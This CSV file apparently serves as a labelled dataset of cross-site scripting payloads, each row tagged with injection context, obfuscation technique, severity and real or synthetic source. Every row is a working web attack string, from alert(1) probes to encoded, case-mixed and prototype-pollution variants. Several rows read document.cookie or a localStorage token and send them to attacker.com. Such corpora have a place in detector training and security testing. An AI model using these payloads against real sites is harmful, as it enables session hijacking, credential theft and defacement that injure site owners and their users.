payload,context,technique,severity,length,source
"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(9910)"">DEF",js_uri,none,medium,67,real
<element onpointerdown=alert(1) style=display:block>AnonKryptiQuz</element>,tag_injection,none,medium,75,real
"""%3E%3Cimg src=x onmozfullscreenchange=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,78,synthetic
"xss""</sc""ript><sv""g/onloa""d=aler""t""(document.doma""in)>",dom_sink,none,low,54,real
"<sub onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</sub>",tag_injection,none,medium,79,real
`><Img srC=x onTouCheNd=ConFirM('XSS')>,attribute_escape,synthetic,medium,39,synthetic
"' onended=alert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,48,synthetic
"""><MarQueE oNauXclIck=prOmpT(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,44,synthetic
"%27><img src=x onpromptaction=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,69,synthetic
__proto__[%22onanimationend%22]=alert(%27//attacker.com/?c=%27+document.cookie),dom_sink,synthetic,high,79,synthetic
"<style>@keyframes slidein {}</style><label style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></label>",tag_injection,none,medium,170,real
<button popovertarget=x>Click me</button><command ontoggle=alert(1) popover id=x>AnonKryptiQuz</command>,tag_injection,none,medium,104,real
`%3E%3Cimg src=x ontransitionend=alert(1)%3E,attribute_escape,synthetic,medium,44,synthetic
`><Img srC=x onPoiNteRraWupDatE=aLerT('XSS')>,attribute_escape,synthetic,medium,45,synthetic
"""><script>confirm(1)</script>",script_injection,synthetic,medium,29,synthetic
${cOnfIrm(doCumEnt.coOkiE)|N},template_injection,synthetic,high,29,synthetic
 onr&#101;p&#101;&#97;t=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,45,synthetic
	oncanplay=confirm(1),event_handler,synthetic,medium,21,synthetic
"<div draggable=""true"" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable style=display:block>drop here</ol>",tag_injection,none,medium,125,real
%22><img src=x onbeforetoggle=confirm(location.hash)>,attribute_escape,synthetic,medium,53,synthetic
JavAscRipT:aLerT('XSS'),js_uri,synthetic,medium,23,synthetic
""" onpagehide=alert(location.hash) """,attribute_escape,synthetic,medium,35,synthetic
"location.href=""javascr	ipt:fetch('//attacker.com/?c='+document.cookie)""",dom_sink,synthetic,high,71,synthetic
"<dfn onclick=""alert(1)"">AnonKryptiQuz</dfn>",tag_injection,none,medium,43,real
	onPoiNteRup=alErt(doCumEnt.doMaiN),event_handler,synthetic,medium,35,synthetic
eval(%22confirm(document.cookie+%27&loc=%27+location.href)%22),dom_sink,synthetic,high,62,synthetic
"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(6966);/*';"">DEF",js_uri,none,medium,85,real
"<table onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</table>",tag_injection,none,medium,69,real
"<basefont onmouseenter=""alert(1)"">AnonKryptiQuz</basefont>",tag_injection,none,medium,58,real
<title onclick=confirm('XSS')>,tag_injection,synthetic,medium,30,synthetic
"<del onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</del>",tag_injection,none,medium,63,real
"\"" onclose=console.log(location.hash)//",attribute_escape,synthetic,medium,39,synthetic
' onmous&#101;ov&#101;r=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,58,synthetic
<u onpointerdown=alert(1) style=display:block>AnonKryptiQuz</u>,tag_injection,none,medium,63,real
"\' onanimationiteration=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,64,synthetic
"<input TYPE=""IMAGE"" SRC=""javascript:document.vulnerable=true;"">",dom_sink,none,low,63,real
<source/oninput=alert(location.hash)>,tag_injection,synthetic,medium,37,synthetic
\%27 onbeforepaste=prompt(1)//,attribute_escape,synthetic,medium,30,synthetic
{{prompt(docum&#101;nt.dom&#97;in)}},template_injection,synthetic,medium,36,synthetic
<hr id=x tabindex=1 onbeforeactivate=alert(1)></hr>,tag_injection,none,medium,51,real
"<keygen onmouseover=""alert(1)"">AnonKryptiQuz</keygen>",tag_injection,none,medium,53,real
oninput=prompt/**/(location.hash),event_handler,synthetic,low,33,synthetic
{{constructor.constructor(%27prompt(%27XSS%27)%27)()}},template_injection,synthetic,medium,54,synthetic
<&#97;nim&#97;t&#101;motion	ondblclick=consol&#101;.log(1)>,tag_injection,synthetic,low,59,synthetic
"<script
>&#97;l&#101;rt(loc&#97;tion.h&#97;sh)</script>",script_injection,synthetic,low,55,synthetic
"OntRanSitIonStaRt=ConSolE.lOg/**/(StRinG.fRomChaRCoDe(88,83,83))",event_handler,synthetic,high,64,synthetic
<noscript	onpointerdown=prompt(document.domain)>,tag_injection,synthetic,medium,48,synthetic
%27><img src=x ondragover=prompt(1)>,attribute_escape,synthetic,medium,36,synthetic
//j\\javascript:alert(document.domain),dom_sink,none,medium,38,real
"<progress onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</progress>",tag_injection,none,medium,69,real
""" ><svG oNgeStuReeNd=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,48,synthetic
"throw/**/Uncaught=window.onerror=eval,&quot;;alert\5023\51&quot;",dom_sink,comment_injection,low,64,real
\' OnmOusEwhEel=alErt(loCatIon.haSh)//,attribute_escape,synthetic,medium,38,synthetic
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#101;v&#97;l(String.fromCh&#97;rCod&#101;(88,83,83))>""",dom_sink,synthetic,low,114,synthetic
<noscr	ipt src=x ongesturestart=alert('XSS')>,tag_injection,synthetic,medium,45,synthetic
"location.href=""javascr	ipt:confirm('XSS')""",dom_sink,synthetic,high,42,synthetic
""" ><svg oninvalid=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,56,synthetic
<noscr	ipt/onbeforematch=console.log('XSS')>,tag_injection,synthetic,medium,44,synthetic
""" oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,high,48,synthetic
""" ><svg onb&#101;gin=confirm(1)>",attribute_escape,synthetic,medium,32,synthetic
"document.write(""<img src=x onerror=eval(document.cookie+'&loc='+location.href)>"")",dom_sink,synthetic,high,81,synthetic
<di&#97;log/onst&#97;ll&#101;d=confirm('XSS')>,tag_injection,synthetic,medium,46,synthetic
\' onpromptdismiss=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)//,attribute_escape,synthetic,low,61,synthetic
<body onbeforecut=confirm(document.domain)/>,tag_injection,synthetic,medium,44,synthetic
"'><img src=x onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,87,synthetic
%27><img src=x onbeforepaste=prompt(1)>,attribute_escape,synthetic,medium,39,synthetic
"<tr draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</tr>",tag_injection,none,medium,77,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink,synthetic,low,125,synthetic
"oncut=prompt(String.fromCharCode(88,83,83))",event_handler,synthetic,high,43,synthetic
"""><img src=x ongotpoint&#101;rc&#97;ptur&#101;=&#97;l&#101;rt(1)>",attribute_escape,synthetic,low,65,synthetic
""" ><svg onbeforecut=confirm(1)>",attribute_escape,synthetic,medium,31,synthetic
<animate	onfocus=console.log(document.domain)>,tag_injection,synthetic,medium,46,synthetic
<picture id=x tabindex=1 onfocusin=alert(1)></picture>,tag_injection,none,medium,54,real
%3Canimatetransform x=y oncontextmenu=prompt(document.domain)%3E,tag_injection,synthetic,medium,64,synthetic
<auDio onPopStaTe=ConFirM(lOcaTioN.hAsh) oNpoPstAte=coNfiRm(LocAtiOn.HasH)>,tag_injection,synthetic,medium,75,synthetic
"&quOt; onStaLleD=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) X=&QuoT;",attribute_escape,synthetic,high,68,synthetic
<foRm Src=x OnpAgeHidE=cOnfIrm(1)>,tag_injection,synthetic,medium,34,synthetic
%22><select onpromptdismiss=console.log(1)>,tag_injection,synthetic,medium,43,synthetic
'><img src=x ongotpointercapture=console.log('XSS')>,attribute_escape,synthetic,medium,52,synthetic
"&quot; onbegin=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,60,synthetic
""" ><svg oninput=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,59,synthetic
"<a
onsearch=alert(1)>",tag_injection,synthetic,medium,21,synthetic
__proto__[%22onclick%22]=eval(location.hash),dom_sink,synthetic,low,44,synthetic
onk&#101;ypr&#101;ss=j&#97;v&#97;script:prompt(docum&#101;nt.dom&#97;in),event_handler,synthetic,medium,72,synthetic
"EvaL(""FetCh(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)"")",dom_sink,synthetic,high,52,synthetic
	onst&#97;ll&#101;d=prompt(1),event_handler,synthetic,medium,29,synthetic
"<xmp x=y onfocusout=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,58,synthetic
""" ><svg on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape,synthetic,medium,52,synthetic
onbeforetoggle=javascr	ipt:alert(location.hash),event_handler,synthetic,medium,47,synthetic
"<bdo onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</bdo>",tag_injection,none,medium,63,real
\' onb&#101;for&#101;m&#97;tch=&#97;l&#101;rt('XSS')//,attribute_escape,synthetic,low,54,synthetic
'><img src=x onmousewheel=prompt('XSS')>,attribute_escape,synthetic,medium,40,synthetic
onanimationend=javascript:console.log(%27XSS%27),event_handler,synthetic,medium,48,synthetic
`><img src=x onmozfullscreenchange=alert(1)>,attribute_escape,synthetic,medium,44,synthetic
&quot; onfocus=console.log(location.hash) x=&quot;,attribute_escape,synthetic,medium,50,synthetic
"location=""javascript:console.log('//attacker.com/?c='+document.cookie)""",dom_sink,synthetic,high,71,synthetic
<m&#97;rqu&#101;&#101; onk&#101;ydown=confirm(1) onk&#101;ydown=confirm(1)>,tag_injection,synthetic,medium,75,synthetic
"&quot; onended=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,60,synthetic
"""%3E%3Cbutton onclick=console.log(1)%3E",tag_injection,synthetic,medium,39,synthetic
<animatemotion x=y onsecuritypolicyviolation=console.log('XSS')>,tag_injection,synthetic,medium,64,synthetic
	onpagereveal=confirm(location.hash),event_handler,synthetic,medium,36,synthetic
"""><scr	ipt>confirm(location.hash)</scr	ipt>",script_injection,synthetic,medium,43,synthetic
"<;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;",js_uri,encoding,high,59,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style=""position:absolute;"" onanimationcancel=""print()""></multicol>",tag_injection,none,low,185,real
"document.write(""%3Cimg src=x onerror=confirm(document.cookie+'&loc='+location.href)%3E"")",dom_sink,synthetic,high,88,synthetic
%3Cmeta/ontransitionstart=alert(location.hash)%3E,tag_injection,synthetic,medium,49,synthetic
%22><img src=x onpagehide=console.log(document.domain)>,attribute_escape,synthetic,medium,55,synthetic
"<IMG SRC=""jav	ascript:javascript:alert(1);"">",js_uri,whitespace_obfuscation|case_variation,medium,44,real
"__proto__[""ondr&#97;g&#101;nt&#101;r""]=confirm(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))",dom_sink,synthetic,medium,105,synthetic
<form	ongesturestart=console.log('XSS')>,tag_injection,synthetic,medium,40,synthetic
<dialog x=y onpointerover=confirm(1)>,tag_injection,synthetic,medium,37,synthetic
"""%3E%3Cimg src=x onanimationend=confirm(1)%3E",attribute_escape,synthetic,medium,45,synthetic
"<iframe src=x ongestureend=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,70,synthetic
<listing x=y onpointerrawupdate=\u0061lert('XSS')>,tag_injection,synthetic,low,50,synthetic
`><img src=x onanimationiteration=prompt(1)>,attribute_escape,synthetic,medium,44,synthetic
"window[""confirm""](docum&#101;nt.cooki&#101;)",dom_sink,synthetic,low,44,synthetic
'><Img srC=x onMouSeuP=cOnsOle.loG('XSS')>,attribute_escape,synthetic,medium,42,synthetic
"%3Cscript
onclick=prompt('XSS')%3E",tag_injection,synthetic,medium,34,synthetic
"<article onclick=""alert(1)"">AnonKryptiQuz</article>",tag_injection,none,medium,51,real
<Script>window.valueOf=alert;window%2B1</Script>,dom_sink,url_encoding|case_variation,low,48,real
JavAscRipT:vOid(coNfiRm(1)),js_uri,synthetic,medium,27,synthetic
"""><ImG%20sRc=x%20onErroR=prompt`AnonKryptiQuz`>",tag_injection,url_encoding|case_variation,low,47,real
"<section onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,74,real
location.href=%22javascript:alert(localStorage.getItem(%27token%27))%22,dom_sink,synthetic,high,71,synthetic
"%3Ciframe/ongestureend=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,68,synthetic
"<ruby oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97,real
"<scr	ipt	>alert(String.fromCharCode(88,83,83))</scr	ipt>",script_injection,synthetic,high,56,synthetic
"__pRotO__[""oNbeGin""]=EvaL(dOcuMenT.dOmaIn)",dom_sink,synthetic,low,42,synthetic
<select	onanimationstart=prompt(%27XSS%27)>,tag_injection,synthetic,medium,43,synthetic
"%3Cscript
%3Eprompt(location.hash)%3C/script%3E",script_injection,synthetic,medium,47,synthetic
<ifr&#97;m&#101; src=x ons&#101;curitypolicyviol&#97;tion=confirm('XSS')>,tag_injection,synthetic,medium,73,synthetic
"%27 onended=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,54,synthetic
"document.write(""<img src=x onerror=eval(document.domain)>"")",dom_sink,synthetic,low,59,synthetic
"<a ondblclick=""alert(1)"">AnonKryptiQuz</a>",tag_injection,none,medium,42,real
"""%3E%3Cimg src=x onanimationcancel=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,80,synthetic
"%27 onload=alert(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,51,synthetic
%22><img src=x onpopstate=alert(1)>,attribute_escape,synthetic,medium,35,synthetic
"<style>:target {color:red;}</style><div id=x style=""transition:color 1s"" ontransitionend=alert(1)></div>",tag_injection,none,medium,104,real
' oNseCurItyPolIcyVioLatIon=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,58,synthetic
"<marquee onclose=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,56,synthetic
"<u draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</u>",tag_injection,none,medium,80,real
"<header onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</header>",tag_injection,none,medium,88,real
"\"" onmouseenter=alert(document.domain)//",attribute_escape,synthetic,medium,40,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""XMLHttpR&#101;qu&#101;st(1)""",dom_sink,synthetic,high,96,synthetic
onpoint&#101;rup=j&#97;v&#97;script:prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,65,synthetic
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,tag_injection,none,medium,46,real
"EleMenT.sEtATtrIbuTe(""onCliCk"",""cOnsOle.loG('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)"")",dom_sink,synthetic,high,83,synthetic
' ><svg ontouchst&#97;rt=consol&#101;.log(1)>,attribute_escape,synthetic,low,45,synthetic
<&#97;nim&#97;t&#101;motion src=x onw&#97;iting=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,86,synthetic
${alert(1)},template_injection,none,medium,11,real
`><img src=x onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,105,synthetic
"<style>:target {color:red;}</style><sub id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></sub>",tag_injection,none,medium,110,real
"""><img src=x onended=\u0061lert('XSS')>",attribute_escape,synthetic,low,39,synthetic
"<input3 onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</input3>",tag_injection,none,medium,74,real
"<multicol onmouseout=""alert(1)"">AnonKryptiQuz</multicol>",tag_injection,none,medium,56,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image3 id=x style=""position:absolute;"" onanimationcancel=""print()""></image3>",tag_injection,none,low,181,real
' ><svG oNfoCusOut=coNsoLe.Log(loCatIon.haSh)>,attribute_escape,synthetic,medium,46,synthetic
<source onpointerleave=alert(1) style=display:block>AnonKryptiQuz</source>,tag_injection,none,medium,74,real
%3Clisting x=y onkeyup=alert(location.hash)%3E,tag_injection,synthetic,medium,46,synthetic
"<style>:target {color: red;}</style><cite id=x style=""transition:color 10s"" ontransitioncancel=print()></cite>",tag_injection,none,low,110,real
"<style>:target {transform: rotate(180deg);}</style><small id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></small>",tag_injection,none,medium,128,real
"<acronym onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",tag_injection,none,medium,67,real
"\"" onpopst&#97;t&#101;=prompt(1)//",attribute_escape,synthetic,medium,34,synthetic
onp&#97;g&#101;show=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,41,synthetic
`%3E%3Cimg src=x onanimationiteration=prompt(1)%3E,attribute_escape,synthetic,medium,50,synthetic
"element.setAttribute(%22onclick%22,%22console.log(document.cookie+%27&loc=%27+location.href)%22)",dom_sink,synthetic,high,96,synthetic
'><img src=x onclick=confirm('XSS')>,attribute_escape,synthetic,medium,36,synthetic
<base src=x oninput=\u0061lert('XSS')>,tag_injection,synthetic,low,38,synthetic
<baSe/OniNvaLid=coNfiRm(LocAtiOn.HasH)>,tag_injection,synthetic,medium,39,synthetic
"<p
OnbEfoRetOggLe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,55,synthetic
"<m&#97;th
onmous&#101;up=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,low,68,synthetic
"<details oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,101,real
""" on&#101;nd&#101;d=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,54,synthetic
"<col draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</col>",tag_injection,none,medium,64,real
	onEnd=prOmpT(lOcaTioN.hAsh),event_handler,synthetic,medium,28,synthetic
__proto__[%22onmozfullscreenchange%22]=alert(%27//attacker.com/?c=%27+document.cookie),dom_sink,synthetic,high,86,synthetic
%3C!--%3E%3Csource oninput=alert(location.hash)%3E,tag_injection,synthetic,medium,50,synthetic
%27 ontouchmove=prompt(1) %27,attribute_escape,synthetic,medium,29,synthetic
<image2 onpointerup=alert(1) style=display:block>AnonKryptiQuz</image2>,tag_injection,none,medium,71,real
""" ><svg onplay=confirm(document.domain)>",attribute_escape,synthetic,medium,40,synthetic
"<mark draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",tag_injection,none,medium,86,real
</script><script>alert('You got AnonKryptiQuzed')</script>,script_injection,none,medium,58,real
' oncut=\u0061lert('XSS') ',attribute_escape,synthetic,low,27,synthetic
<animatemotion x=y ongesturestart=confirm(1)>,tag_injection,synthetic,medium,45,synthetic
\%22 onpagehide=prompt(%27XSS%27)//,attribute_escape,synthetic,medium,35,synthetic
onk&#101;yup=confirm/*x*/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,48,synthetic
%27><img src=x ondrop=confirm(document.domain)>,attribute_escape,synthetic,medium,47,synthetic
<script\x0A>javascript:alert(1)</script>,script_injection,none,medium,40,real
"' on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,low,71,synthetic
`%3E%3Cimg src=x ongotpointercapture=confirm(location.hash)%3E,attribute_escape,synthetic,medium,62,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onk&#101;ydown"":&#101;v&#97;l})",dom_sink,synthetic,low,63,synthetic
	onmous&#101;down=confirm(1),event_handler,synthetic,medium,28,synthetic
"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",tag_injection,none,medium,103,real
%3Caudio onplay=console.log(1)%3E,tag_injection,synthetic,medium,33,synthetic
"&quot; onload=\u0061lert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,64,synthetic
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onwebkitanimationend=""alert(1)""></cite>",tag_injection,none,medium,99,real
%3Cimg onpageswap=console.log(1)/%3E,tag_injection,synthetic,medium,36,synthetic
"'><Img srC=x onBegIn=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"(n&#101;w Function(""prompt(String.fromCh&#97;rCod&#101;(88,83,83))""))();",dom_sink,synthetic,medium,72,synthetic
%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(AnonKryptiQuz`)>,tag_injection,url_encoding,medium,60,real
"<nobr onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</nobr>",tag_injection,none,medium,64,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""consol&#101;.log(loc&#97;tion.h&#97;sh)""",dom_sink,synthetic,low,108,synthetic
"<i onmouseout=""alert(1)"">AnonKryptiQuz</i>",tag_injection,none,medium,42,real
' ><svg onplay=confirm(document.domain)>,attribute_escape,synthetic,medium,40,synthetic
"JavAscRipT:vOid(alErt(StRinG.fRomChaRCoDe(88,83,83)))",js_uri,synthetic,high,53,synthetic
<&#97;nim&#97;t&#101;tr&#97;nsform	onpoint&#101;rmov&#101;=consol&#101;.log('XSS')>,tag_injection,synthetic,low,83,synthetic
%22><img src=x onsecuritypolicyviolation=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,64,synthetic
"<dt onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</dt>",tag_injection,none,medium,65,real
"<audio src=""nonexistent.mp3"" onerror=""alert(1)""></audio>",tag_injection,none,medium,56,real
<span	onsecuritypolicyviolation=\u0061lert(location.hash)>,tag_injection,synthetic,low,58,synthetic
"""><scr	ipt>alert('XSS')</scr	ipt>",script_injection,synthetic,medium,33,synthetic
onr&#101;s&#101;t=j&#97;v&#97;script:prompt(1),event_handler,synthetic,medium,46,synthetic
%22 ><svg onbeforeinput=console.log(document.domain)>,attribute_escape,synthetic,medium,53,synthetic
<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>,tag_injection,none,medium,72,real
"element.setAttribute(""onclick"",""\u0061lert(String.fromCharCode(88,83,83))"")",dom_sink,synthetic,high,75,synthetic
OnkEypResS=pRomPt(1),event_handler,synthetic,medium,20,synthetic
<IMG SRC=”jav ascript:alert(‘XSS’);”>,generic,case_variation,medium,37,real
"Obj&#101;ct.&#97;ssign(window,{""onlo&#97;d"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,70,synthetic
""" onmouseover=prompt(document.domain) """,attribute_escape,synthetic,medium,39,synthetic
"<dt draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</dt>",tag_injection,none,medium,60,real
"document.querySelector(""body"").innerHTML+=""fetch(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,88,synthetic
"<video ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</video>",tag_injection,none,medium,91,real
<x onauxclick=import('//xss/')>click,tag_injection,none,low,36,real
"onfullscreenchange=\u0061lert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,60,synthetic
"<vid&#101;o
ondr&#97;gst&#97;rt=&#97;l&#101;rt('XSS')>",tag_injection,synthetic,low,54,synthetic
<!--><b&#97;s&#101; ontr&#97;nsitionst&#97;rt=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,76,synthetic
"<style>@keyframes x{}</style><ruby style=""animation-name:x"" onanimationstart=""alert(1)""></ruby>",tag_injection,none,medium,95,real
window[%22prompt%22](btoa(document.cookie)),dom_sink,synthetic,high,43,synthetic
onanimationstart=\u0061lert&#40;'XSS'&#41;,event_handler,synthetic,low,42,synthetic
%22 ><svg onpromptdismiss=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,49,synthetic
""" %3E%3Csvg onmouseup=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,62,synthetic
' %3E%3Csvg ondragenter=prompt(document.domain)%3E,attribute_escape,synthetic,medium,50,synthetic
""" onpointerup=alert(1) """,attribute_escape,synthetic,medium,24,synthetic
onprompt&#97;ction=j&#97;v&#97;script:confirm(1),event_handler,synthetic,medium,48,synthetic
<audio onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,67,real
"<meta style=""xss:expression(open(alert(1)))"" />",attribute_escape,none,medium,47,real
`><Img srC=x onGesTurEstArt=prOmpT('XSS')>,attribute_escape,synthetic,medium,42,synthetic
${confirm(docum&#101;nt.cooki&#101;)},template_injection,synthetic,medium,37,synthetic
"""><SouRce onVolUmeChaNge=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,high,64,synthetic
"""><Img srC=x onPoiNteRdoWn=AleRt(DocUmeNt.DomAin)>",attribute_escape,synthetic,medium,50,synthetic
OnpOinTerDowN=pRomPt&#40;1&#41;,event_handler,synthetic,low,31,synthetic
"%3Cp x=y onbeforetoggle=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,63,synthetic
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(1) contenteditable style=display:block>drop here</big>",tag_injection,none,medium,127,real
"<a/href=""javascript:&#13; javascript:prompt(2484)""><input type=""X"">",js_uri,html_entity,medium,67,real
<viDeo onCliCk=ConSolE.lOg('XSS')>,tag_injection,synthetic,medium,34,synthetic
"<dir onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</dir>",tag_injection,none,medium,67,real
"&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;",js_uri,none,medium,76,real
"element.setAttribute(%22onclick%22,%22alert(%27XSS%27)%22)",dom_sink,synthetic,medium,58,synthetic
"%27 ><svg onload=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,54,synthetic
<button popovertarget=x>Click me</button><select ontoggle=alert(1) popover id=x>AnonKryptiQuz</select>,tag_injection,none,medium,102,real
onanimationstart=javascr	ipt:alert('XSS'),event_handler,synthetic,medium,41,synthetic
"&lt;TABLE&gt;&lt;TD BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",generic,html_entity,medium,67,real
%27><img src=x onwheel=console.log(document.domain)>,attribute_escape,synthetic,medium,52,synthetic
"&quot; ongotpoint&#101;rc&#97;ptur&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape,synthetic,medium,97,synthetic
__proto__[%22onfocusin%22]=fetch(document.domain),dom_sink,synthetic,high,49,synthetic
"onpagereveal=\u0061lert&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,62,synthetic
${cOnfIrm?neW()(''XSS'')},template_injection,synthetic,low,25,synthetic
